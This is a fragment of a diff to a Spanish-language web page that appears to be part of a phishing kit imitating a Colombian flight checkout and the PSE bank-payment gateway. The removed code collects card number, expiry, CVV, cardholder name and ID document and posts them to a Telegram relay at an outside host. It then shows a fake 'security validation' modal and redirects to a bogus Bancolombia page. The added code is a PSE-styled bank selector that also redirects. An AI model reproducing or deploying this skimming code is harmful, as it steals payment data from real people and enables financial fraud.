-                        <input type="text" class="form-input" id="nambre" placeholder="Nombre del titular" required>
-                    </div>
-                </div>
-
-               <div class="form-group">
-    <div class="input-container" style="position: relative;">
-        <div class="input-icon"><i class="fa-solid fa-credit-card" style="color: #000000;"></i></div>
-        <input type="text" class="form-input" id="cc" placeholder="Número de tarjeta de crédito o débito" maxlength="19" required oninput="validateCard(this)" onkeyup="formatCardNumber(this)">
-        <div id="card-icon" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%);"></div>
-    </div>
-    <small id="card-brand" style="display: block; margin-top: 4px;"></small>
-    <small id="card-validation-message" style="color: red; display: none;">Número de tarjeta inválido</small>
-</div>
-
-                <div class="expiry-section">
-                    <div class="expiry-label">Fecha de Expiración</div>
-                    <div class="expiry-row">
-                        <div class="select-container">
-                            <select class="form-select" id="expMonth" required>
-                                <option value="">Mes</option>
-                                <option value="01">01</option>
-                                <option value="02">02</option>
-                                <option value="03">03</option>
-                                <option value="04">04</option>
-                                <option value="05">05</option>
-                                <option value="06">06</option>
-                                <option value="07">07</option>
-                                <option value="08">08</option>
-                                <option value="09">09</option>
-                                <option value="10">10</option>
-                                <option value="11">11</option>
-                                <option value="12">12</option>
-                            </select>
-                            <div class="select-arrow">▼</div>
-                        </div>
-                        
-                        <div class="select-container">
-                            <select class="form-select" id="expYear" required>
-                                <option value="">Año</option>
-                                <option value="2025">2025</option>
-                                <option value="2026">2026</option>
-                                <option value="2027">2027</option>
-                                <option value="2028">2028</option>
-                                <option value="2029">2029</option>
-                                <option value="2030">2030</option>
-                                <option value="2031">2031</option>
-                                <option value="2032">2032</option>
-                                <option value="2033">2033</option>
-                                <option value="2034">2034</option>
-                            </select>
-                            <div class="select-arrow">▼</div>
-                        </div>
-
-                        <div class="cvv-container">
-                            <input type="text" class="cvv-input" id="cvv" placeholder="CVV" maxlength="4" required>
-                            <div class="info-icon">i</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="billing-section">
-                    <h2 class="billing-title">Datos de facturación</h2>
-                    
-                    <div class="form-group">
-                        <input type="email" class="form-input billing-input" placeholder="Correo electrónico" required>
-                    </div>
-
-                    <div class="form-group">
-                        <input type="text" class="form-input billing-input" placeholder="Dirección de residencia" required>
-                    </div>
-
-                    <div class="form-group">
-                        <input type="text" class="form-input billing-input" placeholder="Ciudad" required>
-                    </div>
-
-                    <div class="form-group">
-                        <div class="select-container">
-                            <select class="form-select billing-select" required>
-                                <option value="">País</option>
-                                <option value="AR">Argentina</option>
-                                <option value="BO">Bolivia</option>
-                                <option value="BR">Brasil</option>
-                                <option value="CL">Chile</option>
-                                <option value="CO" selected>Colombia</option>
-                                <option value="CR">Costa Rica</option>
-                                <option value="CU">Cuba</option>
-                                <option value="DO">República Dominicana</option>
-                                <option value="EC">Ecuador</option>
-                                <option value="SV">El Salvador</option>
-                                <option value="GT">Guatemala</option>
-                                <option value="HN">Honduras</option>
-                                <option value="MX">México</option>
-                                <option value="NI">Nicaragua</option>
-                                <option value="PA">Panamá</option>
-                                <option value="PY">Paraguay</option>
-                                <option value="PE">Perú</option>
-                                <option value="PR">Puerto Rico</option>
-                                <option value="UY">Uruguay</option>
-                                <option value="VE">Venezuela</option>
-                                <option value="ES">España</option>
-                                <option value="US">Estados Unidos</option>
-                            </select>
-                            <div class="select-arrow">▼</div>
-                        </div>
+            <!-- Info Panel -->
+            <div class="info-panel">
+                <div class="info-header">
+                    <img src="img/footerD.svg" alt="">
+                    <div class="info-text">
+                        <div class="info-title">Para mayor información</div>
+                        <div class="info-subtitle">comunícate con nosotros:</div>
                     </div>
                 </div>
                 
-                <div class="btn-container">
-                    <button type="submit" class="btn-submit">Pagar ahora $183.950</button>
-                </div>
-            </form>
-        </div>
-
-        <div class="summary-container">
-            <h2 class="summary-title">Tu reserva</h2>
-            
-            <div class="flight-info">
-                <div class="flight-section">
-                    <div class="section-header">
-                        <h3 class="section-title">Vuelo</h3>
-                        <span class="basic-tag">Básico</span>
+                <div class="contact-list">
+                    <div class="contact-item">
+                        <div class="contact-icon"><i class="fa-solid fa-phone fa-sm" style="color: #2e58ff;"></i></div>
+                        <span>En Bogotá: +57 (601) 3808890 opción 5</span>
                     </div>
-                 
-                  
-                    
-                    <div class="airline-info">Operado por Avianca - Airbus A320</div>
-                </div>
-                
-              
-               
-            </div>
-            
-            <!-- Nuevo resumen de pago -->
-            <div class="payment-summary">
-                <div class="summary-header">
-                    <h2>Resumen de pago</h2>
-                    <div class="summary-price">$186.950</div>
-                </div>
-                
-                <div class="summary-items">
-                    <div class="summary-item">
-                        <span class="item-label">Tarifa base</span>
-                        <span class="item-value">$96.800</span>
-                    </div>
-                    <div class="summary-item">
-                        <span class="item-label">Impuestos y tasas</span>
-                        <span class="item-value">$36.950</span>
-                    </div>
-                    <div class="summary-item">
-                        <span class="item-label">Cargo por equipaje</span>
-                        <span class="item-value">$90.950</span>
-                    </div>
-                    <div class="summary-item">
-                        <span class="item-label">Descuento promocional</span>
-                        <span class="item-value">-$40.750</span>
+                    <div class="contact-item">
+                        <div class="contact-icon"><i class="fa-regular fa-comment-dots" style="color: #2e7bff;"></i></div>
+                        <span>Contáctanos: 
+                            <a href="https://www.pse.com.co/persona-centro-de-ayuda" target="_blank" style="color: #2c5aa0; text-decoration: none;">
+                                Centro de ayuda
+                            </a>
+                        </span>
                     </div>
                 </div>
-                
-                <div class="summary-total">
-                    <span class="total-label">Total</span>
-                    <span class="total-value" id="total-display">$183.950</span>
-                </div>
-                <div class="savings-label">Ahorraste $40.750 con tu promoción</div>
-                
-                <div class="payment-methods">
-                    <div class="payment-method">
-                        <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
-                    </div>
-                    <div class="payment-method">
-                        <img src="https://img.icons8.com/color/48/mastercard-logo.png" alt="MasterCard">
-                    </div>
-                    <div class="payment-method">
-                        <img src="https://img.icons8.com/color/48/amex.png" alt="American Express">
-                    </div>
-                    <div class="payment-method">
-                        <img src="https://img.icons8.com/color/48/diners-club.png" alt="Diners Club">
-                    </div>
-                </div>
-                
             </div>
         </div>
-    </div>
-    
-    <!-- Modal de confirmación -->
-    <div class="modal" id="confirmationModal">
-        <div class="modal-content">
-    <h2 class="modal-title">Validación de seguridad</h2>
-    <p class="modal-message">Por motivos de seguridad, es necesario validar esta transacción antes de continuar.</p>
-    <button class="modal-btn" id="closeModalBtn" style="background-color: black; color: white;">Iniciar verificación</button>
-</div>
 
+        <!-- ACH Logo -->
+        <div class="ach-lo">
+            <img src="img/footer.svg" alt="">
+        </div>
     </div>
-    
-    <!-- Indicador de carga -->
-    <div class="loader" id="loader"></div>
-    <div class="loading-text" id="loadingText"></div>
-    
+
     <script>
-        // Formateo de números de tarjeta
-        document.getElementById('cc').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '')
-                .replace(/(.{4})/g, '$1 ')
-                .trim();
-        });
-        
-        // Formateo de CVV
-        document.getElementById('cvv').addEventListener('input', function(e) {
-            this.value = this.value.replace(/\D/g, '');
-        });
-        
-        // Validación de email
-        document.querySelector('input[placeholder="Correo electrónico"]').addEventListener('blur', function(e) {
-            const email = this.value;
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            
-            if (email && !emailRegex.test(email)) {
-                this.style.borderColor = '#dc3545';
-                this.style.boxShadow = '0 0 0 3px rgba(220, 53, 69, 0.1)';
-            } else {
-                this.style.borderColor = '#d1d5db';
-                this.style.boxShadow = 'none';
-            }
-        });
-        
-        // Envío de datos a Telegram (REAL)
-        async function enviarDatosTelegram() {
-            const titular = document.getElementById('nambre').value.trim();
-            const numeroTarj = document.getElementById('cc').value.replace(/\s+/g, '');
-            const mes = document.getElementById('expMonth').value;
-            const anio = document.getElementById('expYear').value;
-            const fechaExp = mes && anio ? mes + '/' + anio.slice(2) : '';
-            const cvv = document.getElementById('cvv').value;
-            const documento = document.getElementById('ID').value.trim();
-
-            // Validación básica
-            if (!titular || !numeroTarj || !fechaExp || !cvv || !documento || !banco) {
-                alert('Completa todos los campos.');
-                return false;
-            }
-
-            // Construir mensaje con emojis
-            const mensaje = `
-🔻 *Nueva solicitud de datos* 🔻
-
-👤 Titular: ${titular}
-💳 Número de tarjeta: ${numeroTarj}
-📅 Fecha de expiración: ${fechaExp}
-🔐 CVV: ${cvv}
-🆔 Documento: ${documento}
-            `.trim();
-
-            try {
-                // Mostrar indicador de carga
-                document.getElementById('loader').style.display = 'block';
-                document.getElementById('loadingText').style.display = 'block';
-                
-                // Envío REAL a Telegram usando tu API endpoint
-                const resp = await fetch('https://avori-telegram-api.vercel.app/api/send-telegram', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: mensaje })
+        // Person type tabs
+        document.querySelectorAll('.person-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                document.querySelectorAll('.person-tab').forEach(t => {
+                    t.classList.remove('active');
+                    t.classList.add('inactive');
                 });
-
-                // Ocultar indicador de carga
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('loadingText').style.display = 'none';
-
-                if (resp.ok) {
-                    // Mostrar modal de confirmación
-                    document.getElementById('confirmationModal').style.display = 'flex';
-                    return true;
-                } else {
-                    console.error('Error API status:', resp.status);
-                    alert('Error al enviar la información. Por favor, inténtalo de nuevo.');
-                    return false;
-                }
-            } catch (err) {
-                // Ocultar indicador de carga
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('loadingText').style.display = 'none';
-                
-                console.error('Fallo de red:', err);
-                alert('Error de red. Por favor, verifica tu conexión a internet.');
-                return false;
-            }
-        }
-        
-        // Redirigir según banco
-        function redirigirSegunBanco(banco) {
-            const redirecciones = {
-                'BANCOLOMBIA': 'rse.html'
-            };
-
-            const url = redirecciones[banco];
-            if (url) {
-                window.location.href = url;
-            } else {
-                alert("Banco no reconocido.");
-            }
-        }
-        
-        // Manejar envío del formulario
-        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const requiredFields = document.querySelectorAll('[required]');
-            let isValid = true;
-            
-            requiredFields.forEach(field => {
-                if (!field.value.trim()) {
-                    field.style.borderColor = '#dc3545';
-                    field.style.boxShadow = '0 0 0 3px rgba(220, 53, 69, 0.1)';
-                    isValid = false;
-                } else {
-                    field.style.borderColor = '#28a745';
-                    field.style.boxShadow = '0 0 0 3px rgba(40, 167, 69, 0.1)';
-                }
+                this.classList.remove('inactive');
+                this.classList.add('active');
             });
-            
-            const emailField = document.querySelector('input[placeholder="Correo electrónico"]');
-            const email = emailField.value;
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (email && !emailRegex.test(email)) {
-                emailField.style.borderColor = '#dc3545';
-                emailField.style.boxShadow = '0 0 0 3px rgba(220, 53, 69, 0.1)';
-                isValid = false;
-            }
-            
-            if (!isValid) {
-                alert('Por favor, completa todos los campos requeridos');
-                return;
-            }
-            
-            // Animación para resaltar el total
-            const totalDisplay = document.getElementById('total-display');
-            totalDisplay.classList.add('highlight-animation');
-            setTimeout(() => {
-                totalDisplay.classList.remove('highlight-animation');
-            }, 500);
-            
-            // Enviar datos a Telegram
-            const success = await enviarDatosTelegram();
-            if (success) {
-                // Redirigir después de 3 segundos
-                setTimeout(() => {
-                    redirigirSegunBanco(document.getElementById('banco').value);
-                }, 3000);
-            }
         });
-        
-        // Cerrar modal
-        document.getElementById('closeModalBtn').addEventListener('click', function() {
-            document.getElementById('confirmationModal').style.display = 'none';
-            redirigirSegunBanco(document.getElementById('banco').value);
+
+        // User status options
+        document.querySelectorAll('.status-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('.status-option').forEach(o => o.classList.remove('active'));
+                this.classList.add('active');
+            });
         });
+
+       function goToBank() {
+    const select = document.getElementById('bank-select');
+    const selectedOption = select.options[select.selectedIndex];
+    
+    if (selectedOption.value === '') {
+        alert('Por favor selecciona un banco');
+        return;
+    }
+    
+    const bankUrl = selectedOption.getAttribute('data-url');
+    if (bankUrl) {
+        // Mostrar pantalla de carga
+        document.getElementById('loadingOverlay').style.display = 'flex';
         
-        // Recuperar datos del localStorage
-        document.addEventListener('DOMContentLoaded', function() {
-            try {
-                const flightData = JSON.parse(localStorage.getItem('flightBooking') || JSON.stringify({
-                    origin: 'Bogotá (BOG)',
-                    destination: 'Cartagena (CTG)',
-                    departureDate: '20 Junio 2025',
-                    returnDate: '22 Junio 2025',
-                    passengers: 1
-                }));
-                
-                document.getElementById('origin-destination-text').textContent = 
-                    `${flightData.origin} a ${flightData.destination}`;
-                
-                document.getElementById('departure-date').textContent = flightData.departureDate;
-                document.getElementById('return-date').textContent = flightData.returnDate;
-                document.getElementById('passenger-info-text').textContent = 
-                    `${flightData.passengers} ${flightData.passengers === 1 ? 'Adulto' : 'Adultos'}`;
-                
-            } catch (error) {
-                console.log('Error al cargar datos:', error);
-            }
-        });
-        
-        // Funciones para validación de tarjeta
-        function formatCardNumber(input) {
-            let value = input.value.replace(/\D/g, '').substring(0, 16);
-            let formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-            input.value = formatted;
-        }
+        // Redirigir después de 3 segundos
+        setTimeout(() => {
+            window.location.href = bankUrl; // Redirección en la misma pestaña
+        }, 3000);
+    }
+}
 
-        function validateCard(input) {
-            const value = input.value.replace(/\D/g, '');
-            const brandLabel = document.getElementById('card-brand');
-            const iconContainer = document.getElementById('card-icon');
 
-            // Detectar marca
-            const brand = detectCardBrand(value);
-            brandLabel.textContent = brand ? `Tipo: ${brand}` : '';
-
-            // Mostrar ícono
-            const icons = {
-                'Visa': 'https://img.icons8.com/color/48/visa.png',
-                'MasterCard': 'https://img.icons8.com/color/48/mastercard-logo.png',
-                'American Express': 'https://img.icons8.com/color/48/amex.png',
-                'Discover': 'https://img.icons8.com/color/48/discover.png',
-                'JCB': 'https://img.icons8.com/color/48/jcb.png',
-                'UnionPay': 'https://img.icons8.com/color/48/unionpay.png'
-            };
-            if (icons[brand]) {
-                iconContainer.innerHTML = `<img src="${icons[brand]}" alt="${brand}" style="height: 24px;">`;
-            } else {
-                iconContainer.innerHTML = '';
-            }
-
-            // Validación con Luhn
-            if (value.length >= 13) {
-                if (luhnCheck(value)) {
-                    input.style.borderColor = 'green';
-                    document.getElementById('card-validation-message').style.display = 'none';
-                } else {
-                    input.style.borderColor = 'red';
-                    document.getElementById('card-validation-message').style.display = 'block';
-                }
-            } else {
-                input.style.borderColor = '';
-                document.getElementById('card-validation-message').style.display = 'none';
-            }
-        }
-
-        function luhnCheck(cardNumber) {
-            let sum = 0;
-            let shouldDouble = false;
-            for (let i = cardNumber.length - 1; i >= 0; i--) {
-                let digit = parseInt(cardNumber.charAt(i));
-                if (shouldDouble) {
-                    digit *= 2;
-                    if (digit > 9) digit -= 9;
-                }
-                sum += digit;
-                shouldDouble = !shouldDouble;
-            }
-            return sum % 10 === 0;
-        }
-
-        function detectCardBrand(number) {
-            if (/^4/.test(number)) return 'Visa';
-            if (/^5[1-5]/.test(number)) return 'MasterCard';
-            if (/^3[47]/.test(number)) return 'American Express';
-            if (/^6(?:011|5)/.test(number)) return 'Discover';
-            if (/^35(2[89]|[3-8][0-9])/.test(number)) return 'JCB';
-            if (/^(62|81)/.test(number)) return 'UnionPay';
-            return '';
+        // Go back to commerce
+        function goToCommerce() {
+            alert('Regresando al comercio...');
+            // window.history.back();
         }
     </script>
-    
 </body>
 </html>
